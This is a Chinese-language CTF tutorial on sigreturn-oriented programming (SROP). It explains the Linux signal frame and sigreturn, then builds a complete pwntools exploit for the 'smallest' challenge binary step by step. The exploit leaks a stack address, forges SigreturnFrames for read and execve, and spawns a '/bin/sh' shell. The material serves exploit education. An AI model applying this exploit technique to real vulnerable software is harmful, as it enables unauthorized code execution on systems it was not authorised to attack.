> 参考资料：[https://blog.csdn.net/qq_41202237/article/details/107512670](https://blog.csdn.net/qq_41202237/article/details/107512670)
>

# signal机制
**signal 机制是类 unix 系统中进程之间****<font style="color:#F5222D;">相互传递信息</font>****的一种方法。**一般，我们也称其为**<font style="color:#F5222D;">软中断信号</font>**，或者**<font style="color:#F5222D;">软中断</font>**。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般分为三大步：、

> kill可不是字面意思--杀死进程
>
> **KILL功能描述：用于向任何进程组或进程发送信号。**
>

① 内核向某个进程**发送signal机制**，该进程会被暂时**挂起**，**进入内核态**

② 内核会为该进程保存相应的上下文，**跳转到之前注册好的signal handler中处理signal**

③ **signal返回**

④ 内核为进程恢复之前保留的上下文，恢复进程的执行

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598239928005-92bbf6dd-56db-432d-90c7-6aeb49bfabaf.png)

1. 内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。
2. 内核会为该进程保存相应的上下文，**主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址**。此时栈的结构如下图所示，我们称ucontext以及siginfo这一段为**Signal Frame**。**<font style="color:#F5222D;">需要注意的是，这一部分是在用户进程的地址空间的。</font>**之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598239928334-6b709e70-5bde-4b24-96fc-4d59957229e2.png)

对于signal Frame来说，不同会因为架构的不同而因此有所区别，这里给出分别给出x86以及x64的sigcontext:

```c
//x86
struct sigcontext
{
  unsigned short gs, __gsh;
  unsigned short fs, __fsh;
  unsigned short es, __esh;
  unsigned short ds, __dsh;
  unsigned long edi;
  unsigned long esi;
  unsigned long ebp;
  unsigned long esp;
  unsigned long ebx;
  unsigned long edx;
  unsigned long ecx;
  unsigned long eax;
  unsigned long trapno;
  unsigned long err;
  unsigned long eip;
  unsigned short cs, __csh;
  unsigned long eflags;
  unsigned long esp_at_signal;
  unsigned short ss, __ssh;
  struct _fpstate * fpstate;
  unsigned long oldmask;
  unsigned long cr2;
};
```

# 
```c
//x64
struct _fpstate
{
  /* FPU environment matching the 64-bit FXSAVE layout.  */
  __uint16_t        cwd;
  __uint16_t        swd;
  __uint16_t        ftw;
  __uint16_t        fop;
  __uint64_t        rip;
  __uint64_t        rdp;
  __uint32_t        mxcsr;
  __uint32_t        mxcr_mask;
  struct _fpxreg    _st[8];
  struct _xmmreg    _xmm[16];
  __uint32_t        padding[24];
};

struct sigcontext
{
  __uint64_t r8;
  __uint64_t r9;
  __uint64_t r10;
  __uint64_t r11;
  __uint64_t r12;
  __uint64_t r13;
  __uint64_t r14;
  __uint64_t r15;
  __uint64_t rdi;
  __uint64_t rsi;
  __uint64_t rbp;
  __uint64_t rbx;
  __uint64_t rdx;
  __uint64_t rax;
  __uint64_t rcx;
  __uint64_t rsp;
  __uint64_t rip;
  __uint64_t eflags;
  unsigned short cs;
  unsigned short gs;
  unsigned short fs;
  unsigned short __pad0;
  __uint64_t err;
  __uint64_t trapno;
  __uint64_t oldmask;
  __uint64_t cr2;
  __extension__ union
    {
      struct _fpstate * fpstate;
      __uint64_t __fpstate_word;
    };
  __uint64_t __reserved1 [8];
};
```

signal handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。

# 攻击原理
仔细回顾一下内核在signal信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在Signal Frame中。但是需要注意的是：

+ **<font style="color:#F5222D;">Signal Frame被保存在用户的地址空间中，所以用户是可以读写的。</font>**
+ 由于内核与信号处理程序无关(kernel agnostic about signal handlers)，它并不会去记录这个signal对应的Signal Frame，**<font style="color:#F5222D;">所以当执行sigreturn系统调用时，此时的Signal Frame并不一定是之前内核为用户进程保存的Signal Frame。</font>**

说到这里，其实，SROP的基本利用原理也就出现了。下面举两个简单的例子。

## 获取shell
<font style="color:rgba(0, 0, 0, 0.87);">首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详细的信息</font>

<font style="color:rgba(0, 0, 0, 0.87);">  
</font>![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598252882215-a549c428-3497-43d6-aeb0-546dc6e25204.png)

当系统执行完sigreturn系统调用之后，会执行一系列的pop指令以便于恢复相应寄存器的值，当执行到rip时，就会将程序执行流指向syscall地址，根据相应寄存器的值，此时，便会得到一个shell。

## system call chains
需要指出的是，上面的例子中，我们只是单独的获得一个shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可

+ **控制栈指针。**
+ **把原来rip指向的**`**syscall**`** gadget换成**`**syscall; ret**`** gadget。**

如下图所示 ，这样当每次syscall返回的时候，栈指针都会指向下一个Signal Frame。因此就可以执行一系列的sigreturn函数调用。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598252939278-77c21600-42e5-4240-8cc5-43f7e68fe4a2.png)

## 后续
需要注意的是，我们在构造ROP攻击的时候，需要满足下面的条件

+ **可以通过栈溢出来控制栈的内容**
+ **需要知道相应的地址**
    - **"/bin/sh"**
    - **Signal Frame**
    - **syscal**
    - **sigreturn**
+ 需要有够大的空间来塞下整个sigal frame

此外，关于sigreturn以及syscall;ret这两个gadget在上面并没有提及。提出该攻击的论文作者发现了这些gadgets出现的某些地址：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598252941548-b840ddcb-b5c4-437d-97bb-c23a18036009.png)

并且，作者发现，有些系统上SROP的地址被随机化了，而有些则没有。比如说`Linux < 3.3 x86_64`（在Debian 7.0， Ubuntu Long Term Support， CentOS 6系统中默认内核），可以直接在vsyscall中的固定地址处找到syscall&return代码片段。如下

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598252939417-6d013ea4-064a-4202-9843-9d981d030da1.png)

但是目前它已经被`vsyscall-emulate`和`vdso`机制代替了。此外，目前大多数系统都会开启ASLR保护，所以相对来说这些gadgets都并不容易找到。

**<font style="color:#F5222D;">值得一说的是，对于sigreturn系统调用来说，在64位系统中，sigreturn系统调用对应的系统调用号为15，只需要RAX=15，并且执行syscall即可实现调用syscall调用。而RAX寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说read函数的返回值为读取的字节数。</font>**

## 利用工具
**在目前的pwntools中已经集成了对于srop的攻击。**

# 使用情况
在汇编代码中看到存在systemcall的时候可以考虑采用该方法进行尝试

下面给出我们将会用到的64位函数及函数调用号和函数原型

| 系统调用 | 调用号 | 函数原型 |
| :---: | :---: | :---: |
| read | 0 | read( int fd, void *buf, size_t count ) |
| write | 1 | write( int fd, const void *buf, size_t count ) |
| sigreturn | 15 | int sigreturn( … ) |
| execve | 59 | execve( const char *filename, char *const argv[], char *const envp[] ) |


# 示例
> 附件下载：[https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/srop/2016-360%E6%98%A5%E7%A7%8B%E6%9D%AF-srop](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/srop/2016-360%E6%98%A5%E7%A7%8B%E6%9D%AF-srop)
>

将文件下载下来，检查一下文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598240775225-fbb44684-97fa-4568-94df-7396f85987c4.png)

64位程序，只开启了NX保护，这意味着我们不能在栈上注入shellcode

将文件扔到IDA中：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598240875785-43a0c018-3ca0-44fb-9a8c-b9c3fad4dce1.png)

emmm，这就是pwn吗？只给了这么一小段代码来getshell。爱了爱了...

将汇编代码摘出来，加上注释我们看一下

```c
xor     rax, rax       #异或rax，相当于把rax清零
mov     edx, 400h      #将400h放入rdx的低16位edx中
mov     rsi, rsp       #将栈顶的内容赋值给rsi 
mov     rdi, rax       #将rax==0赋值给rdi中 
syscall                #执行系统调用 
retn                   #函数返回，pop rip（rsp+8）
```

> 在64位程序中，函数的一参存放在rdi寄存器中，二参存放在rsi寄存器中，三参存放在rdx寄存器中。
>

从上面的代码可以看到，rdi、rsi、rdx三个寄存器分别存放了系统调用的三个参数。

因为在64位程序中系统调用号为0的函数为read函数，所以实际上上述的代码执行的是syscall(0, 0, rsp, 0x400)，也就是read(0, rsp, 0x400)，向栈顶读入0x400字节的内容。

由于读入的数据过大,毫无疑问,会发生栈溢出.

我们使用edb来调试一下，这是一个基于Linux的elf文件调试器。

> edb和Windows上的OD使用差不多，这里就不再过多的介绍了
>

---

什么？你问edb的安装方式？

答：[https://github.com/eteran/edb-debugger](https://github.com/eteran/edb-debugger)

附上Ubuntu >= 15.10的安装脚本：

```shell
# install dependencies
sudo apt-get install       \
    cmake                  \
    build-essential        \
    libboost-dev           \
    libqt5xmlpatterns5-dev \
    qtbase5-dev            \
    qt5-default            \
    libqt5svg5-dev         \
    libgraphviz-dev        \
    libcapstone-dev        \
    pkg-config


# build and run edb
git clone --recursive https://github.com/eteran/edb-debugger.git
cd edb-debugger
mkdir build
cd build
cmake ..
make
./edb
```

> 请将文件保存为xxx.sh文件，然后在终端运行
>
> 安装完成之后鼠标双击运行../edb/edb-debugger/build/目录下的edb即可启动
>

---

启动edb，将elf文件载入。

> 如果提示权限不足，在终端中执行chmod 777 smallest 再次运行即可
>

# 第一次尝试
单步步过走到syscall的位置停住，返回到shell界面会等待我们输入，反正是随便输入，输入我都名字就好了-Cyberangel，如下图所示：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598243079946-dd5e3cf9-3196-44c1-9e09-7933a5836f5d.png)

按下回车，rip移动到ret指令，相应的，输入的Cyberangel也被压入栈中：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598243200227-d92cd8ac-dfd9-453a-b0dd-22a2e5563ede.png)

下面程序就要执行ret指令了，我们猜测一下，ret之后程序会报错，单步步过后：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598243277921-79ea409f-2484-453a-8ac0-3d145b2150a4.png)

这是因为输入的字符串Cyberangel被压入到了栈顶，此时rsp指向它，当我们ret时，相当于执行了pop rip和rsp+8，rip指向地址:Cyberangel，这个地址不存在，所以会报错.

# 第二次尝试
从第一次尝试我们可以看到，程序的ret位会返回到我们输入的字符串所代表的的地址，那么假设我们以小端序输入一段地址呢，那ret返回的时候是不是就会返回到我们输入的地址了？

首先我们还是输入任意字符123456，运行程序将123456压入栈中，然后执行下图的修改:

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598244963593-b55a91c2-b052-4698-9671-2372ffbbef51.png)

先点击一下选中“hollk”字符串对应的16进制，然后右键选择Edit Bytes修改栈中数据:

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598245011863-2fb05152-e21f-45c3-95b2-537c560b1742.png)

将内容修改为b0 00 40 00 00 00 00 00

> 请注意这里的小端序
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598245136340-d2b59184-78cd-4383-9c2d-9059c71bed75.png)

点击ok，看一下栈的情况:

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598245165971-0127ddc3-a7b1-4a0c-9966-a2eaa4f3b8d8.png)

这样一来就相当于我们输入了一段地址，猜测一下，ret返回到输入的0x00000000004000b0地址，ip指针重新指向xor rax rax

执行ret指令试试:

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598245494392-e373e3b3-675c-4dab-8dbb-9e3c89149405.png)

可以看到程序返回到了0x004000b0处.

# 总体思路
接下来看一下我们getshell的思路:

+ 利用程序第一次正常调用的read函数向栈中读入payload以部署三个start函数的起始位置,也就是xor rax,rax代码地址（0x00000000004000B0），我们将其记作start_addr
+ 在第一次执行部署的read函数时，向程序写入“\xb3”，**使得在栈中部署的第二个start_addr****<font style="color:#F5222D;">的地址</font>****覆盖为**0x00000000004000B3（请注意：覆盖的并不是start_addr的返回地址），**<font style="color:#F5222D;">并使rax寄存器值变为1</font>**，利用系统调用调用write函数。
+ 控制write函数打印出从当前栈顶开始的0x400个字节的内容，并接受指定信息
+ 在栈中部署read函数需要对应的寄存器值，调用sigreturn将栈中数据压进寄存器
+ 在栈中部署/bin/sh字符串，以及execve函数需要对应的寄存器值，调用sigreturn将栈中数据压进寄存器

> 看的有点懵?没关系,继续往下看就行了
>

---

> 为什么输入’\xb3‘就可以使rax寄存器的值变为1？
>
> 因为在执行read函数的时候，rax寄存器会起到计数的功能，会记录输入字符串的字节长度，由于’\xb3‘只占1个字节，所以rax寄存器会变为1
>

## 控制write函数打印栈地址
我们为什么要打印栈地址呢？我们在第四步中需要知道read函数将我们部署的内容具体写在了栈的哪个位置，所以需要打印出我们想要部署的位置的地址

我们前面讲过start函数的代码实际上是进行一个read函数的调用，那么这个调用是由系统调用号来决定的。回顾一下前面start函数的代码

```shell
.text:00000000004000B0                 xor     rax, rax
.text:00000000004000B3                 mov     edx, 400h
.text:00000000004000B8                 mov     rsi, rsp
.text:00000000004000BB                 mov     rdi, rax
.text:00000000004000BE                 syscall
.text:00000000004000C0                 retn
```

rdi寄存器里面的值作为系统调用号，因为rdi寄存器里面的值是rax寄存器赋值的，所以关键就在于rax寄存器。如果想要控制执行write，那么势必不能执行xor rax,rax 的操作(因为write的系统调用号为1)。

那么想控制write函数需要具备两个条件：

+ 更改rax寄存器里面的值为1
+ 越过0x00000000004000B0

首先看第一个条件，**<font style="color:#F5222D;">rax作为一个具有计数功能的寄存器，在使用read函数写的时候会记录写入字符串的字节数(可以看一下下面的图)。</font>**那么我们其实可以控制输入1字节的字符串来控制rax寄存器

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598246373304-d2709650-3952-4532-92d7-73eb8272a593.png)

再看第二个条件，如果我们想使用read函数控制rax的话就需要绕过rax清零的操作，那么为何不直接将原有的输入地址覆盖掉呢？如果我们一开始输入三个小端序的0x00000000004000B0（后面讲为什么是三个），分别记做start_addr1、start_addr2、start_addr3

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598246408084-3cc69982-1cef-4e84-b3ee-10142c127339.png)

那么第一次执行read函数调用后，ret操作对应的rsp指针会指向我们部署的star_addr1

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598246694545-4b3d4707-31af-4dcf-b4cc-078d6bb37d19.png)

在ret操作之后rsp指针会上移，指向第二个start_addr，即0x00000000004000B0，所以会重新执行read函数。那么第二次执行read函数依然还会从当前的rsp开始写，**<font style="color:#F5222D;">也就是说我们再一次写字符串的时候就会覆盖掉原有的第二个0x00000000004000B0</font>**。**<font style="color:#F5222D;">如果第这次我们输入“\xb3”的话，即1个字节，不仅可以将rax寄存器中的值变为1，还会覆盖原有的0x00000000004000B0的最后一个字节，就会变成0x00000000004000B3</font>**

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598246797380-e51f21e5-d6e6-4185-ac64-2a576a3f2dcf.png)

---

test：

执行read前:

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598247003949-597480d9-1a46-4976-a90e-ed17cc5751d9.png)

执行后:

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598247041870-e6eb0ca1-fc36-41ee-9822-5a5a34bf2612.png)

可以看到栈顶被覆盖

---

那么在第二次执行read函数调用结束之后的ret依然会返回当前rsp指针指向的位置，即从mov edx, 400h这条指令开始，这样一来就会绕过前面的xor rax,rax指令，避免了rax寄存器被清零。并且rsp指针会继续上移指向start_addr3

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598246832755-d5e6eda5-461a-4863-b32a-530471f5946b.png)'

因为此时的rax寄存器中的值为1，也就是说syscall调用的系统调用号为1，那么就不会调用read函数，而是write函数，整个的系统调用就会变成syscall(1, 0, rsp, 0x400)，也就是write(0, rsp, 0x400)，这将会打印从栈顶开始的0x400字节的内容。**<font style="color:#F5222D;">但是不要忘了，我们部署了三个start_addr，所以还需要从start_addr3的下一位地址进行取值，</font>**我们将取到的新栈顶记做stack_addr

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598248241327-b4786695-ff49-4120-b468-ee96ebf1512a.png)







```python
from pwn import *
from LibcSearcher import *
small = ELF('./smallest')
sh = process('./smallest')
context.arch = 'amd64'
context.log_level = 'debug'
syscall_ret = 0x00000000004000BE #源代码syscall处地址
start_addr = 0x00000000004000B0  #源代码xor rax,rax处地址

payload = p64(start_addr) * 3  #部署三个start_addr，完成三次read函数的调用
sh.send(payload)

#覆盖第二个start_addr的最后一个字节变成0x00000000004000B3，
#越过对rax寄存器的清零，还使得rax寄存器值变为1
sh.send('\xb3')  
stack_addr = u64(sh.recv()[8:16]) #程序调用write函数，使用recv模块接收接下要要部署的栈顶地址
log.success('leak stack addr :' + hex(stack_addr))

sh.interactive()
```

### 使用sigreturn对read函数调用的寄存器进行部署
接下来就需要注意了，我们进入构造的阶段。我们需要通过sigreturn的调用来实现对read函数调用寄存器的部署。值得高兴的是pwntools中已经有了调用sigreturn的功能，所以在写EXP的时候可以直接使用。再部署之前我们需要之想好在哪几个寄存器中部署什么值，下面列出来一一讲解

```plain
----------------------------------
| 寄存器和指令 |      存储数据      | 
----------------------------------
|    rax     |  read函数系统调用号 | 
----------------------------------
|    rdi     |         0         | 
----------------------------------
|    rsi     |    stack_addr     | 
----------------------------------
|    rdx     |       0x400       | 
----------------------------------
|    rsp     |    stack_addr     | 
----------------------------------
|    rip     |    syscall_ret    | 
----------------------------------
```

+ 首先是rax寄存器中一定是存放read函数的系统调用号啦，因为原汇编代码使用的是syscall，这个不多说了
+ rdi寄存器作为read函数的一参，0代表标准输入
+ rsi寄存器作为read函数的二参，里面存放的是前面通过write函数打印出来的新栈顶的地址，**<font style="color:#F5222D;">也就是说将接收到的信息写到我们前面通过write函数打印的新栈顶的位置</font>**
+ rdx作为read函数的三参写0x400个字节
+ rsp寄存器需要和rsi保持一致，在写的时候写在rsp指向的位置
+ rip寄存器指向syscall_ret，确保在read函数寄存器部署成功之后可以直接调用read函数

这些就是我们需要部署的内容，那么怎么将这些东西按照我们想象的结构部署到寄存器中呢？这个时候就用到了前面的signal机制的漏洞了：**当 signal handler 执行完成后就会执行 sigreturn 系统调用来恢复上下文，主要是将之前压入的寄存器的内容给还原回对应的寄存器，然后恢复进程的执行**

就是利用这个原理，**<font style="color:#F5222D;">我们将想要部署的寄存器内容以字符串的方式部署在栈中，之后调用sigreturn将栈中部署的内容还原到对应的寄存器。</font>**当然只有read函数寄存器部署是不够的，还需要调用sigreturn才行

那么解决方法无非就是将rax寄存器中的值改成sigreturn的系统调用号15，然后再进行syscall就可以了。和前面的write函数调用差不多，下面演示一下栈布局

前面write函数执行结束之后ret为当前的rsp指针，即start_addr3位置（往上翻看上一个图）。在执行ret返回后rsp指针会进行上移，也就是指向start3_addr的高一个地址，这个时候会重新第三次执行read函数，也就是说会向当前rsp指针位置重新写。这个时候就可以把我们预想的sigreturn调用和read函数寄存器布局写到栈中了，即输入下方payload

> payload = start_addr + syscall_ret + frame(read)
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598248486208-37a53113-230b-41b9-a2e1-ab404912c2bc.png)

输入之后栈中的布局如上图所示，在第三次read函数调用结束之后的ret位会回到当前rsp指向的地址，也就是还会第四次调用read函数，这个时候rsp指针还会上移至syscall_ret

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598248508107-cf99f1d2-da22-4b94-b2d8-d8be5dd7fd49.png)

由于正在执行第四次read函数，所以shell界面还会等待我们输入，此时输入的值就是为了更改rax寄存器里面的值，此时更改的作用是为了接下来调用sigreturn函数，所以我们需要将rax寄存器中的值变为15，也就是说需要写15个字节。但是有个问题出现了，当前rsp指针指向的位置是syscall，所以我们写的内容会覆盖syscall的内容。那么如果我们写的内容和原有的栈中的内容一样的话，无论怎么覆盖都不会影响原有在栈中的部署结构

所以这个时候我们取原有payload从第8个字节到第8+15字节的内容，也就是正好15个字节。为什么要从第8个字节开始呢？需要注意的是原有的payload是从star_addr开始的，但是我们当前的rsp是从syscall开始的，所以我们要越过start_addr的8个字节，这样一来我们输入的内容就不会破坏原有部署的栈结构，还能使得rax寄存器中的值变为15

这样一来程序运行到原有的syscall的时候就会直接调用sigreturn，将我们在栈中部署的read函数的寄存器内容部署到寄存器中。当原程序运行到ret操作的时候，rsp刚好指向syscall_ret长度位置（见上图）。那么这个时候就会直接根据我们部署在寄存器中的read函数的内容调用read函数，此时shell界面会再一次等待我们输入

> 需要注意的是这个时候调用的read函数并不再是在栈中部署的start_addr了，而是通过寄存器里面的值进行调用的，因为我们ret位返回到的是syscall，越过了源代码中对寄存器的值操作的部分，直接进行系统调用<font style="background-color:transparent;">由于我们需要知道接下来需要部署到哪个位置，前面write函数泄露了一个可控的栈地址stack_addr，所以read函数的二参需</font><font style="background-color:transparent;">要填写stack_addr</font>
>

```python
from pwn import *
from LibcSearcher import *
small = ELF('./smallest')
sh = process('./smallest')
context.arch = 'amd64'
context.log_level = 'debug'
syscall_ret = 0x00000000004000BE #源代码syscall处地址
start_addr = 0x00000000004000B0  #源代码xor rax,rax处地址

payload = p64(start_addr) * 3  #部署三个start_addr，完成三次read函数的调用
sh.send(payload)

#覆盖第二个start_addr的最后一个字节变成0x00000000004000B3，越过对rax寄存器的清零，还使得rax寄存器值变为1
sh.send('\xb3')  
stack_addr = u64(sh.recv()[8:16]) #接收接下要要部署的栈顶地址
log.success('leak stack addr :' + hex(stack_addr))

read = SigreturnFrame()
read.rax = constants.SYS_read #read函数系统调用号
read.rdi = 0  #read函数一参
read.rsi = stack_addr  #read函数二参
read.rdx = 0x400  #read函数三参
read.rsp = stack_addr  #和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr
read.rip = syscall_ret #使得rip指向syscall的位置，在部署好read函数之后能直接调用
payload = p64(start_addr) + p64(syscall_ret) + str(read)
sh.send(payload)
sh.send(payload[8:8+15])  #输入15个字节使得rax寄存器的值为15，进行sigreturn调用

sh.interactive()
```

### 使用sigreturn对execve函数调用的寄存器进行部署
这部分和上一部分部署的方式近乎相同，也是通过sigreturn对寄存器部署，只是有几点小小的区别：

+ execve函数的调用我们只需要对rdi寄存器部署，存放/bin/sh字符串所在地址就可以了，rsi寄存器和rdx寄存器置零就可以了
+ 不止需要对execve函数所用的寄存器进行部署，还需要考虑/bin/sh字符串放在哪个位置
+ 由于前面在部署read函数寄存器的时候rsi寄存器中的值为之前write函数泄露出来的stack_addr，所以这次的位置是从stack_addr开始写的

接下来还是从对寄存器部署内容开始：

```python
----------------------------------
| 寄存器和指令 |      存储数据      | 
----------------------------------
|    rax     | execve函数系统调用号| 
----------------------------------
|    rdi     |     binsh_addr    | 
----------------------------------
|    rsi     |         0         | 
----------------------------------
|    rdx     |         0         | 
----------------------------------
|    rsp     |    stack_addr     | 
----------------------------------
|    rip     |    syscall_ret    | 
----------------------------------
```

对寄存器的构造和前面对read函数部署大致相同，只不过是函数的参数有所改变导致寄存器中的值不一样，就不多讲了

接下来我们需要考虑的就是/bin/sh字符串应该放在哪个位置，这个时候就需要进行计算了，依照前面部署read函数寄存器的方法，我们也规划一下部署execve在栈中的payload结构。主要方法差不多首先返回到原有的xor rax,rax命令处，使shell界面等待我们输入，输入的字节长度为15，作为sigreturn的系统调用号存放在rax寄存器中，然后将在栈中部署好的execve寄存器值转移至相应寄存器中完成对execve的调用。函数调用payload如下：

> payload_exe = start_addr + syscall_ret + frame(execve)
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598248632688-7e3f6684-0deb-4bc7-98b9-6c267490e186.png)

那么到这为止我们函数调用的方面就已经部署好了，如果想知道/bin/sh字符串的地址，就需要知道前面payload_exe的长度时多少，这个长度没法直接通过查找去计算，因为pwntools里面的SigreturnFrame函数是集成好的，我也没找到这个函数具体的长度是多少，不过没有关系，可以直接len(payload_exe)输出看一下就可以了

```python
from pwn import *
from LibcSearcher import *
small = ELF('./smallest')
sh = process('./smallest')
context.arch = 'amd64'
context.log_level = 'debug'
syscall_ret = 0x00000000004000BE #源代码syscall处地址
start_addr = 0x00000000004000B0  #源代码xor rax,rax处地址

payload = p64(start_addr) * 3  #部署三个start_addr，完成三次read函数的调用
sh.send(payload)

#覆盖第二个start_addr的最后一个字节变成0x00000000004000B3，越过对rax寄存器的清零，还使得rax寄存器值变为1
sh.send('\xb3')  
stack_addr = u64(sh.recv()[8:16]) #接收接下要要部署的栈顶地址
log.success('leak stack addr :' + hex(stack_addr))

read = SigreturnFrame()
read.rax = constants.SYS_read #read函数系统调用号
read.rdi = 0  #read函数一参
read.rsi = stack_addr  #read函数二参
read.rdx = 0x400  #read函数三参
read.rsp = stack_addr  #和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr
read.rip = syscall_ret #使得rip指向syscall的位置，在部署好read函数之后能直接调用
payload = p64(start_addr) + p64(syscall_ret) + str(read)
sh.send(payload)
sh.send(payload[8:8+15])  #输入15个字节使得rax寄存器的值为15，进行sigreturn调用

execve = SigreturnFrame()
execve.rax = constants.SYS_execve
# "/bin/sh"字符串地址，这里为了能够让exp3.1正常执行，所以直接给了0x120，下面会将为什么是0x120
execve.rdi = stack_addr + 0x120  
execve.rsi = 0x0 #execve函数二参
execve.rdx = 0x0 #execve函数二参
execve.rsp = stack_addr 
execve.rip = syscall_ret

frame_payload = p64(start_addr) + p64(syscall_ret) + str(execve)
print len(frame_payload)

sh.interactive()
```

可以看到payload_exe的长度为264个字节，也就是十六进制的0x108个字节，也就是说我们将/bin/sh字符串部署在payload_exe后面就可以了，也就是说/bin/sh字符串的地址要大于stack_addr + 0x108的地址，当然尽可能的接近这个地址就可以了，不需要将偏移调的太大。所以凑个整我们就把/bin/sh字符串放在stack_addr + 0x120的位置就好了

那么我们的payload就需要更改一下了，因为我们的/bin/sh字符串要同payload_exe一起写进栈中，那么/bin/sh字符串前面的空位就需要填充一下：

> payload = payload_exe + (0x120 - len(payload_exe)) * '\x00' + '/bin/sh\x00'
>

这样一来我们完整的EXP就构筑好了：

```python
from pwn import *
from LibcSearcher import *
small = ELF('./smallest')
sh = process('./smallest')
context.arch = 'amd64'
context.log_level = 'debug'
syscall_ret = 0x00000000004000BE #源代码syscall处地址
start_addr = 0x00000000004000B0  #源代码xor rax,rax处地址

payload = p64(start_addr) * 3  #部署三个start_addr，完成三次read函数的调用
sh.send(payload)

#覆盖第二个start_addr的最后一个字节变成0x00000000004000B3，越过对rax寄存器的清零，还使得rax寄存器值变为1
sh.send('\xb3')  
stack_addr = u64(sh.recv()[8:16]) #接收接下要要部署的栈顶地址
log.success('leak stack addr :' + hex(stack_addr))

read = SigreturnFrame()
read.rax = constants.SYS_read #read函数系统调用号
read.rdi = 0  #read函数一参
read.rsi = stack_addr  #read函数二参
read.rdx = 0x400  #read函数三参
read.rsp = stack_addr  #和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr
read.rip = syscall_ret #使得rip指向syscall的位置，在部署好read函数之后能直接调用
payload = p64(start_addr) + p64(syscall_ret) + str(read)
sh.send(payload)
sh.send(payload[8:8+15])  #输入15个字节使得rax寄存器的值为15，进行sigreturn调用

execve = SigreturnFrame()
execve.rax = constants.SYS_execve
# "/bin/sh"字符串地址，这里为了能够让exp3.1正常执行，所以直接给了0x120，下面会将为什么是0x120
execve.rdi = stack_addr + 0x120  
execve.rsi = 0x0 #execve函数二参
execve.rdx = 0x0 #execve函数二参
execve.rsp = stack_addr 
execve.rip = syscall_ret

frame_payload = p64(start_addr) + p64(syscall_ret) + str(execve)
print len(frame_payload)
# 将execve函数调用和/bin/sh字符串一起部署到栈中
payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
sh.send(payload)
sh.send(payload[8:8+15])

sh.interactive()
```

